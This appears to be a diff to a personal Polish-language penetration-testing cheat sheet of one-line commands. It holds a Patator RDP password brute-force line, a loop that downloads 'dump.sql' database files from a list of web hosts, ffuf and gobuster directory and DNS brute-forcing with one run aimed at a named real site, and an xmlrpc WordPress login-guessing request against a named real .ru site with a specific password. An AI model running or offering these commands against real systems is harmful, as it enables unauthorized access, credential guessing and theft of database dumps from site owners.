@@ -7,6 +7,22 @@ Oblicz fingerprint usługi ssh (RSA)
 Patator
 # patator rdp_login host=x.x.x.x user='administrator' password=FILE0 0=/pwd/do/passfile.txt -x ignore:fgrep='ERRCONNECT_LOGON_FAILURE'
 
+cat file.txt|tr [:upper:] [:lower:]|sort|uniq
 
-1. nmap
-1a. nmap script nse
+while read -r line;do echo $line;curl -k -L "http://$line/dump.sql" -o $line-dump.sql;done < /home/muser/Documents/addr_www.txt
+
+while read -r line;do ffuf -c -u "https://$line/FUZZ" -w /home/muser/Rekonesans/dictionary/s_fuzz_web.txt -o "/home/muser/Documents/pot/ffuf/https-$line" -r -H "Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/102.0" -of html;done < /home/muser/Documents/pot/addr/all.txt
+
+curl -d '<?xml version="1.0"?> <methodCall> <methodName>wp.getUsersBlogs</methodName> <params> <param> <value>admin</value> </param> <param> <value>sukalove</value> </param> </params> </methodCall>' https://tegrk.ru/xmlrpc.php 
+
+Dradis reset:
+$ cd /usr/lib/dradis;bundle exec thor dradis:reset;chown dradis:dradis /usr/lib/dradis;chown dradis:dradis /usr/lib/dradis/* -R;chown dradis:dradis /var/lib/dradis;chown dradis:dradis /var/lib/dradis/* -R
+
+1. dig @8.8.8.8 domena.pl ANY
+2a. while read -r line;do echo -n $line|tr -d '\n';zm=$(ping -c 1 $line|head -n 1|cut -d "(" -f 2|cut -d ")" -f 1);echo -n ";";if [[ ${#zm} -lt 5 ]]; then echo "Name or service not known"; else echo $zm; fi;done < input_file.txt > results.txt
+2b. eyewitness -f domeny.txt --prepend-https
+3a. gobuster dns -d domena.pl -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+3b. gobuster dir -u https://www.pse.pl -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.35" -k
+4a. nmap
+4b. nmap script nse
+
